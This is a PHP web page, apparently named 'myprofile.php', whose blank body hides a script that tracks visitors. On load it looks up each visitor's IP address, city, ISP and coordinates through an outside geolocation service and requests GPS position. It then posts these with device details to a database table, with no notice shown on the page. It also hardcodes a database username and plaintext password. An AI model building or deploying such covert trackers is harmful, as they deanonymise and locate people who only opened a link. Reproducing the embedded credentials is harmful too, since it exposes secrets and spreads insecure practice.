<?php

// === Only Save If POST ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
    $host = "localhost";
    $db = "tbmecxyu_tariq_tbm";
    $user = "tbmecxyu";
    $pass = "computerk03227861557";

    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (Exception $e) {
        die("DB Connection Failed: " . $e->getMessage());
    }

    $ip = $_POST['ip'] ?? '';
    $userAgent = $_POST['user_agent'] ?? '';
    $country = $_POST['country'] ?? '';
    $region = $_POST['region'] ?? '';
    $city = $_POST['city'] ?? '';
    $lat = $_POST['lat'] ?? null;
    $lon = $_POST['lon'] ?? null;
    $isp = $_POST['isp'] ?? '';
    $gps_lat = $_POST['gps_lat'] ?? null;
    $gps_lon = $_POST['gps_lon'] ?? null;
    $platform = $_POST['platform'] ?? '';
    $width = $_POST['width'] ?? '';
    $height = $_POST['height'] ?? '';

    $stmt = $pdo->prepare("INSERT INTO user_logs (ip, user_agent, country, region, city, lat, lon, isp, gps_lat, gps_lon, platform, browser_width, browser_height, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())");

    $stmt->execute([$ip, $userAgent, $country, $region, $city, $lat, $lon, $isp, $gps_lat, $gps_lon, $platform, $width, $height]);

    echo "Data Saved.";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
   
</head>
<body>
   

    <script>
async function logUserInfo() {
    const res = await fetch("https://ipwho.is/");
    const data = await res.json();

    const userAgent = navigator.userAgent;
    const width = screen.width;
    const height = screen.height;
    const platform = navigator.platform;

    navigator.geolocation.getCurrentPosition(function(position) {
        const gps_lat = position.coords.latitude;
        const gps_lon = position.coords.longitude;

        sendData(data, userAgent, width, height, platform, gps_lat, gps_lon);
    }, function() {
        sendData(data, userAgent, width, height, platform, null, null);
    });
}

function sendData(data, userAgent, width, height, platform, gps_lat, gps_lon) {
    fetch("myprofile.php", {
        method: "POST",
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({
            ip: data.ip,
            user_agent: userAgent,
            country: data.country,
            region: data.region,
            city: data.city,
            lat: data.latitude,
            lon: data.longitude,
            isp: data.connection?.isp || '',
            gps_lat: gps_lat,
            gps_lon: gps_lon,
            platform: platform,
            width: width,
            height: height
        })
    }).then(res => res.text()).then(console.log);
}

logUserInfo();

    </script>
</body>
</html>
